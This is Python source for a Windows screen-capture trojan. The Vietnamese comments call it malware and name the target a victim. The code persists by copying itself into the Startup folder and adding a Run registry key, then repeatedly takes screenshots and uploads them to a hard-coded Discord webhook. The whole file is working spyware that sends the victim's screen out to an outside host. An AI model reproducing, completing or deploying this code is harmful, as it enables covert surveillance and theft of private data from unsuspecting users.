from pyautogui import screenshot
from discord import Embed, File, SyncWebhook
import os
import schedule
from getpass import getuser
import shutil
import winreg as reg
import webbrowser


username_victim = getuser()
# tìm đến file Start Up
startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
# Đường dẫn mã độc
trojan_file = 'SimpleCap.exe'


# nếu đã tạo 1 file tên isStart.txt rồi , giá trị toàn file là 1 thì trả về true, nếu chưa thif tạo và ghi 1 vào trong đó
def cre_KEY():
      with open(os.path.join(startup_folder,'isStart.txt'), "r") as f:
             isStart = f.read()
             if 'none' in isStart :
                    key_reg_trojan = reg.OpenKey(reg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_ALL_ACCESS)
                    reg.SetValueEx(key_reg_trojan, 'DUC_Handsome', 0, reg.REG_SZ, 'SimpleCap.exe')
                    shutil.copy(trojan_file, startup_folder)
                    with open(os.path.join(startup_folder,'isStart.txt'), "wb") as f:
                        content = 'Trojan by Duc Krikman'.encode('utf-8')
                        f.write(content)
try :
        cre_KEY()
         
except:    
        with open(os.path.join(startup_folder,'isStart.txt'), "wb") as f:
                content = 'none'.encode('utf-8')
                f.write(content)
finally:
       cre_KEY()

# vòng lặp chụp màn , gửi qua webhooks dis, 50s 1 lần
def vohan():
        image = screenshot()
        image.save("screenshot.png")

        webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1140118915712827392/5As0lJViVTXZjl7IuzHU3M5Cwb5QAtKOVGxMysYTKFZIF8iEdO6nL4KukMPi1OJVrD6A")
        webhook.send(
                
                file=File('screenshot.png', filename='screenshot.png')
                )

        if os.path.exists("screenshot.png"):
                os.remove("screenshot.png")
schedule.every(2).seconds.do(vohan)
while True:
    schedule.run_pending()